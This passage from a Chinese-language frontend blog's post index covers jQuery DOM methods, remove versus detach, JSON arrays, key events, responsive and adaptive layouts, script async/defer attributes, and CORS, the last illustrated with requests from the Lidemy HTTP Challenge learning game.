&lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 12345678910$('.container').append( $('&lt;button&gt;', { id: 'myId', class: 'myClass', text: 'click Me', on: { click: () =&gt; console.log('click') } })) $('child').appendTo() 把自己放到父元素裡（最後面） 12345&lt;div class=\"container\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 12345678$('&lt;button&gt;', { id: 'myId', class: 'myClass', text: 'click Me', on: { click: () =&gt; console.log('click') }}).appendTo('.container') $('child').prependTo() 把自己放到父元素裡（最前面） 12345&lt;div class=\"container\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 12345678$('&lt;button&gt;', { id: 'myId', class: 'myClass', text: 'click Me', on: { click: () =&gt; console.log('click') }}).prependTo('.container') $('parent').prepend() 把東西放到父元素裡（最前面） 12345&lt;div class=\"container\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 12345678910$('.container').prepend( $('&lt;button&gt;', { id: 'myId', class: 'myClass', text: 'click Me', on: { click: () =&gt; console.log('click') } })) after() 放到旁邊（後面） 1&lt;div class=\"sibling\"&gt;&lt;/div&gt; 1$('.sibling').after($('&lt;div&gt;after&lt;/div&gt;')) before() 放到旁邊（前面） 1&lt;div class=\"sibling\"&gt;&lt;/div&gt; 1$('.sibling').before($('&lt;div&gt;before&lt;/div&gt;')) siblings() 選出所有的兄弟元素（但不包含自己） 12345678910&lt;div&gt; &lt;button class=\"brother\"&gt;兄弟一&lt;/button&gt; &lt;button&gt;兄弟二&lt;/button&gt; &lt;button&gt;兄弟三&lt;/button&gt; &lt;button&gt;兄弟四&lt;/button&gt; &lt;div&gt; 兄弟五 &lt;button&gt;不是兄弟&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 12// [button, button, button, div]console.log($('.brother').siblings()) next() 下一個兄弟元素 12345&lt;div&gt; &lt;div&gt;兄弟&lt;/div&gt; &lt;button class=\"brother\"&gt;兄弟一&lt;/button&gt; &lt;a&gt;兄弟&lt;/a&gt;&lt;/div&gt; 12// [a]console.log($('.brother').next()) nextAll() 後面所有的兄弟元素 1234567&lt;div&gt; &lt;div&gt;兄弟&lt;/div&gt; &lt;button class=\"brother\"&gt;兄弟一&lt;/button&gt; &lt;a&gt;兄弟&lt;/a&gt; &lt;section&gt;兄弟&lt;/section&gt; &lt;article&gt;兄弟&lt;/article&gt;&lt;/div&gt; 12// [a, section, article]console.log($('.brother').nextAll()) prev() 前一個兄弟元素 12345&lt;div&gt; &lt;div&gt;兄弟&lt;/div&gt; &lt;button class=\"brother\"&gt;兄弟一&lt;/button&gt; &lt;a&gt;兄弟&lt;/a&gt;&lt;/div&gt; 12// [div]console.log($('.brother').prev()) prevAll() 前面所有的兄弟元素 1234567&lt;div&gt; &lt;a&gt;兄弟&lt;/a&gt; &lt;section&gt;兄弟&lt;/section&gt; &lt;article&gt;兄弟&lt;/article&gt; &lt;button class=\"brother\"&gt;兄弟一&lt;/button&gt; &lt;div&gt;兄弟&lt;/div&gt;&lt;/div&gt; 12// [article, section, a]console.log($('.brother').prevAll()) hasClass(className) 有沒有包含這個 class jQuery： 12// true / false$('el').hasClass('classNmae') JavaScript： 1element.classList.contains('className') closest(selector) 找出第一個符合選取器的父元素 jQuery： 12// 這個會回傳 jQuery 物件$(element).closest('parent') JavaScript： 12// 這個回傳 DOM 節點element.closest('parent') val() 讀取或設定表單元素的 value jQuery： 1234// 取得 input 的值$('input').val();// 設定 input 的值$('input')val(''); JavaScript： 1234// 取得 input 的值document.querySelector('input').value// 設定 input 的值document.querySelector('input').value = '' remove() 刪除元素（包含自己） 和 JavaScrip 幾乎一樣： 1$('element').remove() on('event', 'selector', function) 事件監聽器，重點是 delegate 比較方便： jQuery： 1234// 直接用第二個 selector 過濾$('element').on('click', 'child', (e) =&gt; { console.log('click')}) JavaScript： 123456document.querySelector('element').addEventListener('click', (e) =&gt; { // 用 class 判定 if (e.classList.contains('className')) { console.log('click') }}) empty() 清空所有子元素（內容） jQuery： 1$('parent').empty() JavaScript： 1document.querySelector('parent').innerHTML = '' 或參考：DOM 清除所有的子元素 serialize() 把表單欄位值轉成 url 字串，通常用在用 $.ajax 傳送資料： 123456$form = $('.form')$form.on('submit', () =&gt; { const formData = $('.form').serialize() // 這邊只是示意，輸出結果為空字串是正常的 console.log(formData)}) 怎麼設定 button 為 disabled 用 attr 1$('.btn').attr('disabled', 'disabled') 用 prop（property 推薦） 1$('.btn').prop('disabled', ture) 怎麼用 $.ajax 的 POST 送表單格式資料詳細可參考 用 jQuery 發 AJAX 1234567891011// 取得表單的內容const formData = new FormData($('form'))$.ajax({ url: `https://api.com`, type: 'POST', data: formData, contentType: false, // required processData: false, // required success: (data) =&gt; callback(null, data), error: (err) =&gt; callback(err)}) 建立 DOM 元素，並插入jQuery 不用像 JavaScript 還要 createElement，而是直接 $(&lt;div&gt;&lt;/div&gt;) 來產生： 12345&lt;div class=\"container\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 123$(`&lt;div&gt; &lt;p&gt;yoyoyo&lt;/p&gt; &lt;/div&gt;`).appendTo('.container') 甚至還可以設定屬性、監聽器： 12345678910$('&lt;button&gt;', { id: 'myId', class: 'myClass', title: 'myTitle', tooltip: '請輸入訊息', text: 'Click Me', // 不可 HTML，會被當純字串 on: { click: () =&gt; console.log('click') }}).appendTo('.conainer') append 的另外一種用途可以拿來「移動元素」，簡單來說就是先 select 畫面上的元素，再把它 append 到別的地方。 123456789101112131415161718192021222324252627&lt;style&gt; body { display: flex; justify-content: center; align-items: center; padding-top: 60px; } div { padding: 20px; margin: 20px; } div.box-red { border: 2px solid red; } div.box-blue { border: 2px solid slateblue; }&lt;/style&gt;&lt;div class=\"box-red\"&gt; &lt;ul&gt; &lt;li&gt;item&lt;/li&gt; &lt;li&gt;item&lt;/li&gt; &lt;li&gt;item&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;div class=\"box-blue\"&gt;&lt;/div&gt;&lt;button&gt;Move it.&lt;/button&gt; 123456789$(document).ready(function () { $('button').on('click', function () { if ($('ul').parent().hasClass('box-red')) { $('ul').appendTo($('.box-blue')) } else { $('ul').appendTo($('.box-red')) } })})","link":"/2022/02/23/jquery-note/"},{"title":"jQuery 的 empty、remove 和 detach 的差別","text":"小知識。 懶人包 empty 不保留元素的內容 remove 保留元素內容，但不保留監聽器 detach 保留元素內容，並保留監聽器 簡述其實這三個 method 都有回傳值，回傳值是 jQuery 物件，裡面會儲存元素的相關資訊： HTML： 123456789&lt;div class=\"div-1\"&gt; &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt;&lt;/div&gt;&lt;div class=\"div-2\"&gt; &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt;&lt;/div&gt;&lt;div class=\"div-3\"&gt; &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt;&lt;/div&gt; 123456const returnValue1 = $('.div-1').empty()const returnValue2 = $('.div-2').remove()const returnValue3 = $('.div-3').detach()console.log(returnValue1[0].innerHTML) // ''console.log(returnValue2[0].innerHTML) // &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt;console.log(returnValue3[0].innerHTML) // &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt; 三個都會保留原本 &lt;div&gt; 的資訊，但因為 empty 的作用是把所有內容給清除，因此留下的資訊也會是空的。 利用這點能做到把一個元素 remove() 後再放回去： 123456789&lt;div class=\"div-1\"&gt; &lt;p&gt;Lorem ipsum dolor, sit amet consectetur adipisicing elit&lt;/p&gt;&lt;/div&gt;&lt;div class=\"div-2\"&gt; &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt;&lt;/div&gt;&lt;div class=\"div-3\"&gt; &lt;p&gt;Lorem ipsum dolor sit&lt;/p&gt;&lt;/div&gt; 12345678910111213// 儲存回傳值let returnValue1// 刪除元素$('.btn-getAway').on('click', () =&gt; { returnValue1 = $('.div-1').remove()})// 利用回傳值來放回去$('.btn-goBack').on('click', () =&gt; { // 先修改 &lt;p&gt; 的內容 returnValue1.find('p').text('yo') // 再放回去 $('.div-3').before(returnValue1)}) 輸出結果： 這樣的好處是不需要重新建立元素，原本的流程應該是： 先 copy 要保留的內容 建立新元素 把 copy 的內容 paste 回新元素裡 插回 DOM 利用上面的方法後就省事多了～ remove 跟 detach 的差別其實最主要只有一點：會不會保留 Event Listener，前者會，後者不會。直接做個實驗你就懂了： 用 remove 移除 123&lt;button class=\"btn-test\"&gt;測試用按鈕&lt;/button&gt;&lt;button class=\"btn-getAway\"&gt;拿掉&lt;/button&gt;&lt;button class=\"btn-goBack\"&gt;放回去&lt;/button&gt; 1234567891011121314// 儲存回傳資訊let returnValue// 對要移除的元素設監聽器$('.btn-test').on('click', () =&gt; { console.log('click!!')})// 移除$('.btn-getAway').on('click', () =&gt; { returnValue = $('.btn-test').remove()})// 放回去$('.btn-goBack').on('click', () =&gt; { $('.btn-getAway').before(returnValue)}) 輸出結果： 用 detach 移除（其實只差在一行） 123&lt;button class=\"btn-test\"&gt;測試用按鈕&lt;/button&gt;&lt;button class=\"btn-getAway\"&gt;拿掉&lt;/button&gt;&lt;button class=\"btn-goBack\"&gt;放回去&lt;/button&gt; 1234567891011121314// 儲存回傳資訊let returnValue// 對要移除的元素設監聽器$('.btn-test').on('click', () =&gt; { console.log('click!!')})// 移除$('.btn-getAway').on('click', () =&gt; { returnValue = $('.btn-test').detach()})// 放回去$('.btn-goBack').on('click', () =&gt; { $('.btn-getAway').before(returnValue)}) 知道這些就差不多了！","link":"/2022/02/25/jquery-remove-empty-detach/"},{"title":"JSON 的格式也可以是陣列","text":"現在才知道… 真的是這樣子詳細可以參考 MDN 上的說明，但總而言之，array 也是合法的 JSON 格式資料： 1234567891011const json = `[ { \"name\": \"PeaNu\", \"age\": 23 }, { \"name\": \"PPB\", \"age\": 24 }]`console.log(JSON.parse(json)) // (2)&nbsp;[{…}, {…}] 或是反其道而行： 123456789101112const array = [ { name: 'PeaNu', age: 23 }, { name: 'PPB', age: 24 }]console.log(JSON.stringify(array))// expect output: [{\"name\":\"PeaNu\",\"age\":23},{\"name\":\"PPB\",\"age\":24}]","link":"/2022/01/06/json-can-be-an-array/"},{"title":"關於 key-event 的觸發時機","text":"今天剛好被雷到。 簡述在顯示文字之前觸發： keypress（會連續觸發） keydown 在顯示文字後才觸發： keyup 這三個的差異要搞清楚，不然寫 event 的時候會出現非預期的結果。","link":"/2022/02/25/key-events/"},{"title":"在學響應式設計前，你應該先知道這些。","text":"其實寫這篇文章的理由很單純，因為自己以前在學 CSS 的時候，撞過不少次牆壁。直到現在，我也不敢保證說自己已經完全掌握 CSS 這個讓人又愛又恨的東西。為什麼說 CSS 讓人又愛又恨？因為當完成一個版面時，那份成就感是讓人感到很舒服的，不過跑版的時候就是另外一回事了… 總而言之，最近因為準備作品的關係，得回來重新回溫一些 CSS 的知識。 特別是在響應式這一塊。我想各位應該都很清楚在這個時代，響應式是個不可或缺的條件吧。所以就讓我們從最基本的佈局（Layout）來一個個介紹吧。 導覽雖然不保證這裡介紹的版面能夠含括所有種類，但我想這些應該都能稱的上是比較廣泛跟常見的類型。這次會介紹的版面有這些： 固定式版面 流動式版面 液態式版面 彈性式版面 流動式格線版面 分欄式版面 單欄式版面 多欄式版面 格線版面 格線式版面 無格線式版面 複合式版面 響應式版面 適應式版面 固定式版面 顧名思義，整個網頁的寬度都會是固定的，並且以 「px」 來作為單位。這是最好理解也是最簡單的方式，不過大部分只有在一開始切出版面時，才會暫時先這樣使用。 Codepen： See the Pen 固定式版面 by jim (@jubeatt) on CodePen. （如果你很懶得開新視窗，麻煩 0.25x 給他點下去） 流動式版面流動式版面最大的特點就是，一個區塊會有 「伸縮（流動）」 的效果，所以會改以 「%」（也有人用「em」） 來作為單位。 而流動式版面又可以在分成： 液態式版面（全程都使用%） 彈性式版面（除了 % 以外，再加上 min-width / max-width 來控制最大與最小範圍） 流動式格線版面（% 混合 px） 液態式版面 整個版面就像水一樣非常流動，這樣的好處是能夠隨著視窗來做伸縮，不會有出現滾軸的情況發生。 但有一個問題是，當 「視窗很大 / 很小」 時，畫面就會變得太緊繃或太寬敞，導致整個網頁看起來怪怪的。 Codepen： See the Pen 液態式版面 by jim (@jubeatt) on CodePen. （你可以到Codepaen裡去調整式視窗，來觀察\"流動\"的效果！） 彈性式版面 這個版面是為了解決液態式版面中「視窗很大 / 很小」的問題，這裡利用了兩個 CSS 屬性： min-width（最小寬度） max-width（最大寬度） 簡單來說： 當一個區塊的寬度 &lt; min-width時，寬度會固定在min-width設定的值，當一個區塊的寬度 &gt; max-width時，寬度會固定在max-width設定的值。 當這樣子設定後，就能確保版面在限制的範圍中伸縮，避免極端值的狀況。 Codepen： See the Pen 彈性版面 by jim (@jubeatt) on CodePen. （這裡建議搭配開發者工具中的box-modal來觀察width的值，會更清楚！） 流動式格線版面 你可以把這種版面當作是一種「混合」的概念。這種類型的版面會讓外層容器 「流動（%）」，內容區塊 「固定（px）」。將這兩者混合，再透過 CSS 的排版設計，就能做出 「隨著寬度產生不同數量的欄位區塊」 這種效果！ Codepen： See the Pen 流動式格線版面 by jim (@jubeatt) on CodePen. （懶得開新分頁的話就按個 1x 0.5x 0.25x 吧） 分欄式版面了解上面的概念後，你就能利用它們做出一個簡單的版型囉！不用想的太複雜，主要就只是的「單欄 / 多欄」的差別而已。而大多數會使用單欄的情況是為了「手機版面」的需求（畢竟手機的寬度有限嘛！），至於多欄大部分是給「電腦版 / 平板」的需求囉！ 不過這只是大部分，不代表一定是照著這個規則。總而言之，還是要看一個網頁的風格取向與使用需求來決定該怎麼分割。 單欄式版面 痾…其實就是一個你用手機去大部分的網站都能看到的單欄版面這樣。絕對沒有私藏什麼撇步！都是前面講過的概念，有興趣的人也可以自己試試看。 Codepen： See the Pen 單欄式版面 by jim (@jubeatt) on CodePen. 多欄式版面 一樣是一個基本的兩欄版面，使用了會暴露年齡的「float」來排版。（喂只要你會兩欄的話，那三欄、四欄、八十七欄，應該都不會有什麼太大的問題，所以這裡就不再多做示範了。 Codepen： See the Pen 兩欄式版面 by jim (@jubeatt) on CodePen. 格線版面格線式版面 如果要用一句簡單來說明什麼是格線，我會說是 「排格子」。因為這種版面其實就是用很多的格子一個個排好、放好，弄成你想要的畫面。 而網格系統基本上會先設定好初始數值，像是： 總共有幾個欄？（直排） 一行有多寬？（橫排） 一欄有多寬？（直排） 欄與欄之間的間距要多少？ 如果以上面的圖片來看的話： 總共有 12 欄 一行的寬度為: 940px 一欄的寬度 : 60px 欄與欄之間的間距 : 20px 所以假設我希望切出兩個區塊，那就會是： 「第一個區塊要佔 6 欄、第二個區塊要佔 6 欄」 所以兩個區塊會各自佔據 460px 的寬度（六個欄寬: 60 x 6 + 五個間距: 20 x 5） 如果還是不太清楚的話你可以對照著上面的圖來看，應該會比較好理解。 所以要怎麼做出網格呢？根據目前我所知道，你可以用以下的方式： 使用 CSS 中的 grid 屬性 使用現成的網格框架（例如：960 grid system） 如果你對grid有興趣的話，可以在自行搜索一些相關資訊，不過這邊為了方便起見，是使用現成的框架來做示範。 Codepen： See the Pen 格線式版面 by jim (@jubeatt) on CodePen. 給萌新的一些小提醒示範中是使用 960 grid system 這個框架來操作，所以可能對於第一次接觸框架的人會看不懂我在寫什麼。但別擔心，其實這一樣是用上面所說的規則在操作的，所以你只要先理解上面的意思，之後再慢慢去補這方面的相關知識即可。 無格線式版面 很明顯就是一個秀技術的版面！ 這種版型的概念是把整個頁面當作是一個 「畫布」，你想放什麼？放在哪裡？都任君挑選。要實現這個版面，基本上會需要依賴大量的 position 屬性來達成。 雖然看起來很酷炫，不過除非你有追求視覺效果的特殊需求，否則我個人不推薦使用這種版型。 實用度比較低 考慮到響應式與相容性的問題時，整個 CSS 也會變得相對複雜許多。 換句話說，除非你有很高超的技術，不然這不是你該隨便亂碰的版型。（不要玩版型） Codepen： See the Pen 無格線式版面 by jim (@jubeatt) on CodePen. （他好像永遠對著你笑，笑得你心裡發寒。） 複合式版面主角總是到最後才登場。沒有錯，這篇文章的重點就在於這個部分了。 粗略一點來說，就是我們很常聽到的的響應式版面。不過如果你上網查詢一些相關資料的話，會發現響應式大致上可以在分成以下兩種： 響應式版面（Response Web Design，以下簡稱 RWD） 適應式版面（Adaptive Web Design，以下簡稱 AWD） 百花齊放，百家爭鳴。 對於這兩種版面的實際差異，每個人有不同的看法，所以我這裡會用我自己的想法來解釋。 什麼是響應式網頁（Response Web Design）？響應式網頁最初是由 “Ethan Marcotte” 在A List Apart 2010 年 5 月的一篇文章中提出的一種想法。（這裡只會大略的講一些大意，有興趣的人可以點進去看更完整的內容。） 作者首先在文章中點出了當時網頁設計佈局所面臨到的問題： Can we really continue to commit to supporting each new user agent with its own bespoke experience? At some point, this starts to feel like a zero sum game. But how can we—and our designs—adapt? 我們真的要持續的為每一個新的使用者客製化一套專屬於他們的體驗嗎？從某些點來說，這開始讓人感覺像是場永遠通不了關的遊戲。但是我們又要如何讓網頁設計能夠做到 “適應” 這件事？ 隨著各式各樣的裝置誕生，我們不能永遠停留在過去的思維，為每一個裝置來設計專屬的網頁佈局。而是要轉變成「能夠響應到每個裝置」的這種設計思維。 為了實現這個理念，作者就和我們前面所講的一樣，讓網頁的區塊變成是「流動的」，這樣確實就能夠做出具有彈性的佈局。 但儘管如此，要真正實現響應式這個想法還是不夠的。如果我們只是單純的讓每個區塊變成是流動的，還是會引發一些問題。（譬如說：解析度特大或特小的裝置） 為此，media queries的存在就很重要了。 media queries可以做到我們原本做不到的事，像是： 在視窗寬度小於 xxx 時… (min-width) 在手機畫面顯示為 xxx 時… (orientation: landscape) 顯示區域的長寬比為 xxx 時 (aspect-ratio) 螢幕的長寬比為 xxx 時 (device-aspect-ratio) 畫面的像素密度為 xxx 時 (resolution) 所以只要能夠善用media queries，基本上就能實現響應式這個概念。 這也是為什麼每當提到響應式，就會跟media queries扯上關係的原因。 那什麼又是適應式網頁？（Adaptive Web Design）適應式網頁是從 2011 年 “Aaron Gustafson” 在他的著作 Adaptive Web Design: Crafting Rich Experiences With Progressive Enhancement 提出的另外一種思維。 所以就時間點來說， AWD 是在 RWD 出現一段時間後， 才被提出的一種設計思維。這也暗示了 RWD 所遭遇的一些問題。 你可以想想看，如果 RWD 是以「在每個裝置都顯示相同的內容」為前提來設計的，那現在假設有個網頁的內容非常多，而且有大筆的資料要載入時，使用手機的人可能會碰到什麼問題？你第一個會直覺想到的可能是載入速度，其次為 使用者體驗(UX) ，而這也是最主要的兩個問題。 為了改善這個問題，AWD 的想法就浮現出來了。所以這裡簡單的介紹一下，AWD 到底是什麼？ 首先 AWD 的設計思維是，預先對每個裝置設定好 斷點(breakpoint) 。譬如最主流的六個：320, 480, 760, 960, 1200 1600 (pixels)接著在為每一個斷點來設計專屬的 固定尺寸（例如：px） 頁面。 所以簡單來說，每一個裝置都會有一個專屬自己的佈局。每當載入這個網頁時，網頁伺服器就會去偵測裝置，並且回應一個最適合這個裝置的頁面給它。 要怎麼區分一個網站是 RWD 還是 AWD？ 其實很簡單，因為不久前我們說過 AWD 的網頁佈局是採用 「固定尺寸」。所以你只要試著去調整瀏覽器的視窗，看看畫面是否會有流動（伸縮）的反應就可以判斷。 如果有伸縮的效果 → RWD 如果沒有伸縮的效果 → AWD 為了方便理解，這裡也提供了一些範例給各位： Amazon 巴哈姆特 USA TODAY 同樣的網站，你用手機跟電腦點進去，會得到不一樣的結果。除了整體的排版明顯不同之外，內容上也不太一樣。不知道你有沒有一種回到過去手機版、電腦版的既視感，不過這並不是，這是 AWD。（如果是手機板，網址通常會有一個前墜字 m） 這裡我也畫了圖來讓大家更好理解這個概念： 或者你也能參考這張圖： 除了以上這些以外，不管是 RWD，還是 AWD，又或是 RWD 與 AWD 之間的差異。其實都還有很多可以探討的細節，但如果要全部講完的話，這篇文章可能會非常非常的長～所以目前就先點到這裡，希望你能對這兩個東西都能有一些概念就好了！這裡也做一個簡單的整理。 響應式(RWD) 適應式(AWD) 由瀏覽器決定頁面（用戶端） 由伺服器決定回傳頁面（伺服器端） 流動區塊 固定區塊 隨寬度改變做調整 載入時偵測並回傳對應網頁 穩定性較差（一個掛 = 全掛） 穩定性較高（各種裝置的網頁間互不影響） 不具有特徵偵測功能 具有特徵偵測功能 （利於商業廣告） 所有裝置採用一種佈局 一個裝置一種佈局 接受相同網頁的資料 根據回傳頁面決定資料量 載入效能較差 載入效能較優 設計範圍較受侷限 可對裝置客製化 成本低、較簡易、快速 製作成本高、耗時、複雜 至於其於的部分，就留給各位去自行探討了。 實作響應式版面 See the Pen 響應式版面(flex) by jim (@jubeatt) on CodePen. 這裡使用 flex 實作，我個人認為以這個範例來說， flex 會比較容易達成，也比較好理解。當然，如果你想看float版本，可以參考這裡 實作適應式版面 See the Pen 適應式版面 by jim (@jubeatt) on CodePen. 注意： 這裡只是做一個演示，主要是呈現「固定版面」的效果。 實際上 AWD 並不是這個樣子哦，據我所知，除了搭配mediq queries以外，真正的 AWD 還需要搭配一系列的 JavaScript 操作來達成。（若有說錯請在糾正我） 所以這裡的範例僅供參考，請不要當成是真的 AWD 哦！ 文末我想在這個滿大街都是響應式的時代，響應式設計是一個前端工程師不得不學習的一項技能。儘管現在有各種框架，但再方便的框架終究還是會有它的限制與極限。所以有些時候，我們還是得具備一些手刻的能力。 響應式設計看似複雜，但它其實也是從最開始的固定版面，一步一步演化過來的產物。我認為響應式的背後其實就是把這些各式各樣的版型，一個個堆疊起來的一種版型。 身為一個學習 CSS 約兩年多的人，我相信試著去理解這些東西，應該會對你在設計版面能有一些幫助。當然，這篇文章也許有很多該提的東西沒有提到，這是因為不希望弄得太複雜，所以才簡化了不少內容。如果你發現文中有錯誤的地方，或是你有其他的疑問或建議，都歡迎你寄信給我。你的回應，對我而言就是最大的支持。 最後，非常謝謝看完這篇文章的各位！ 參考資料STUDIO_by_UXPininteraction-designmeebox_blogiki0723_blogThe Beginner’s Guide to Adaptive Web Design960 grid sysyemHTML5 ‧ CSS3 最強圖解實戰講座HTML and CSS : Design and Build Websites","link":"/2021/07/19/layout-types/"},{"title":"認識 <script> 中的 async 與 defer 屬性","text":"偶然間學到的，所以紀錄一下。 懶人包提醒：這兩個屬性都是基於 src 引入外部資源用的，如果是 inline script 的話沒有任何作用。 首先解釋一下在沒有 async 跟 defer 時的流程： 停止解析 根據路徑發 request 等待 response 拿到 response 後，執行腳本內容 執行完畢，繼續向下解析 async一看名字就知道是用「非同步」來載入外部資源，所以不需要等待 response。 這邊舉個例子： 1234567891011&lt;!-- index.html --&gt;&lt;!-- 這邊在 sever 做了一點設定，要等 3 秒才會拿到 response --&gt;&lt;script src=\"http://localhost:5000/\"&gt;&lt;/script&gt;&lt;button&gt;button&lt;/button&gt;&lt;script&gt; document.querySelector('button').addEventListener('click', () =&gt; { console.log('click') })&lt;/script&gt; 因為不是非同步，所以到 &lt;script src=\"http://localhost:5000/\"&gt;&lt;/script&gt; 就要等 3 秒，後面的東西都不會被執行。 加上 async 就不一樣了： 123456789101112&lt;!-- index.html --&gt;&lt;!-- 一樣要等 3 秒才會拿到 response， 但現在加上 async 就不用在這裡等 --&gt;&lt;script src=\"http://localhost:5000/\" async&gt;&lt;/script&gt;&lt;button&gt;button&lt;/button&gt;&lt;script&gt; document.querySelector('button').addEventListener('click', () =&gt; { console.log('click') })&lt;/script&gt; 雖然會轉圈圈但其實瀏覽器並沒有「阻塞」。 defer顧名思義就是「延遲」，延遲什麼？把腳本延遲到 DOM 元素被解析完後再執行。（嚴謹來說是 DOMContentLoaded 以前，但我覺得知道這樣就夠了） 如果沒有延遲，一碰到 &lt;script&gt; 就會直接執行，這個時候如果 DOM 還沒被解析你就抓不到元素： 12// getElement.jsconsole.log(document.querySelector('button')) 12345&lt;body&gt; &lt;!-- 到這行就直接執行 --&gt; &lt;script src=\"./getElement.js\"&gt;&lt;/script&gt; &lt;button&gt;button&lt;/button&gt;&lt;/body&gt; 加上 defer 就可以確保 DOM 元素解析完才執行： 12345&lt;body&gt; &lt;!-- 等到 DOM 解析完才執行 --&gt; &lt;script src=\"./getElement.js\" defer&gt;&lt;/script&gt; &lt;button&gt;button&lt;/button&gt;&lt;/body&gt; 那兩個一起用代表什麼？不用想太複雜，就是同時套用兩個邏輯： 用非同步去發 request，不要停止解析 如果拿到資料後 DOM 還沒解析完，就等到解析完後再執行 所以簡單來說，一個是用來決定「要不要先停止解析」，另一個是決定「要什麼時候才執行腳本」。","link":"/2022/02/12/learn-async-and-defer-attribute/"},{"title":"從遊戲來認識 CORS 與瀏覽器的限制","text":"很重要的觀念哦！ 前言這篇文章主要會拿 Lidemy HTTP Challenge 這個小遊戲來做說明，所以建議玩過之後再來看，不然可能會看不懂。 另外我也寫了一篇攻略文：HTTP Challenge 攻略與心得 ，有興趣可以參考看看。 關於 CROSCORS 的全名為「Cross-Origin Resource Sharing（跨來源資源共用）」，是一個「瀏覽器」的規範，目的是要讓我們可以「到不同來源的地方」去拿資料。 所以在解釋 CROS 之前，你要先了解為什麼需要 CORS？沒有 CORS 會有什麼問題？ 沒有 CORS 會有什麼問題？故事一樣要從瀏覽器說起，首先有一個叫做「同源政策（Same-origin policy）」的規範，內容是如果「請求資料方」跟「提供資料方」兩者不同源，瀏覽器就會把 response 給擋下來，至於什麼是「不同源」等一下會在解釋。 首先大部分的人在玩 Lidemy HTTP Challenge 的時候是透過 curl 或是在 Node.js 裡搭配 request 來玩的，所以不會碰到這個問題。 但是如果你改用「瀏覽器」的話就不一樣了，拿第三關來舉例： 12345678910111213141516/* 備註：這一關要新增一本書到圖書系統裡*/const xhr = new XMLHttpRequest()// 要傳送的資料const data = new FormData()data.append('name', '《大腦喜歡這樣學》')data.append('ISBN', '9789863594475')// request 資訊xhr.open('POST', 'https://lidemy-http-challenge.herokuapp.com/api/books')// 送出 requestxhr.send(data)// 拿到回應xhr.onload = function () { console.log(this.responseText)} 這時候打開 console 會看到： 備註：這裡我有開 liver-server，所以網址才會是 http://127.0.0.1:5500 這個就叫做「不同源」，因為「域名」不一樣： 請求資料者（我） http://127.0.0.1:5500 的域名是 localhost（這個 ip 就是對應到 localhost） 資料提供者（Lidemy）的域名是 lidemy-http-challenge.herokuapp.com （嚴謹一點來說的話 http 跟 https 也是不同源，不同的 port 也是不同源，只是最常見的是域名） 這兩個是不一樣的，所以雖然 request 被送出去了，但回傳結果被瀏覽器給擋下了。 再特別強調一次，request 還是會送出去，只是結果會被瀏覽器擋下來。 切換到 Network 的欄位，可以看到以下資訊： Status Code 是 200，代表處理成功。也就是說你其實是有新增書本到 server 端，只是回傳結果被瀏覽器擋下來了而已。 備註：其實像 POST 這種會去改 server 端資料的 request 通常會用「Preflight Request」比較嚴謹（詳細可以參考 輕鬆理解 Ajax 與跨來源 request ），不然如果哪天我隨便發一個 DELETE 到 server 就可以直接把東西給刪除掉，也太不安全了，對吧？ 從這裡可以看到雙方的來源，Host 是 Lidemy 的位置，Origin 是我的位置。 所以只要這種 Host 跟 Origin 是來自不同地方的 request ，瀏覽器都會把 response 給擋下來。 為什麼需要 CORS？所以在 同源政策（Same-origin policy） 的規範下，根本不可能做到「去別的地方拿資料」這件事。 CORS 就是用來解決這個問題的。 還記得前面剛剛說過 CORS 的用意是讓我們「到不同來源的地方去拿資料」這件事嗎？現在你只要在 server 端加上一個 header：access-control-allow-origin，就可以做到這件事情。 access-control-allow-origin 是 CORS 這個規範下的一個 header，用來讓 sever 決定「誰可以存取這個資源」的意思。 如果我只想讓「http://example.com:8080」來存取資源，server 就設定： access-control-allow-origin: http://example.com:8080 如果要讓「任何人」都能存取，那就用萬用字元「*」來設定： access-control-allow-origin: * 以 Twitch 的 API 來舉例： 可以跟 Lidemy 對照一下： 兩個只差在有沒有 access-control-allow-origin 而已，Lidemy 沒有加上這個 header，所以我們發 request 的時候 response 會被瀏覽器給擋住，但是 Twitch 有，所以發 request 給 Twitch 不會被瀏覽器給擋下 response： 雖然已經說過很多次了，但還是要再強調一次。你一定要搞清楚瀏覽器擋下的是 sever 回傳的 response，不是你發出去的 request，這個差異很重要。 最後統整幾個重點： 因為同源政策的關係，所以沒辦法到別的地方拿資料 同源政策的機制是瀏覽器會把 response 擋下來，但實際上 request 還是有發出去 CORS 是用來解決同源政策的限制，實現「跨來源」交換資料這件事，實現的方法就是在 server 端加上 access-control-allow-origin: * 大致上就是這樣，不過還有另外一種實現「跨來源」交換資料的老方法，叫做「JSONP」，簡單來說就是藉由 &lt;script src=\"xxx\"&gt; 來發出 request ，詳細可以參考我以前寫的文章：實作 JSONP。 關於瀏覽器的限制瀏覽器除了有同源政策的規範之外，還有一個限制是不可以竄改 User-Agent 的內容。 在遊戲的第九關，不是會要你去把 User-Agent 改成 IE6 的內容嗎？如果用瀏覽器來做的話一樣會發現行不通： 123456789101112131415161718/* 備註：這一關要取得「系統資訊」中的資料*/const xhr = new XMLHttpRequest()// 設定requestxhr.open('GET', 'https://lidemy-http-challenge.herokuapp.com/api/v2/sys_info')// http basic 驗證xhr.setRequestHeader('Authorization', 'Basic YWRtaW46YWRtaW4xMjM=')// 題目要求的自定義 headerxhr.setRequestHeader('X-Library-Number', '20')// 把 user-agent 改成 IE6 的資訊xhr.setRequestHeader('user-agent', 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)')// 送出requestxhr.send()// 拿到回傳結果xhr.onload = function () { console.log(this.responseText)} 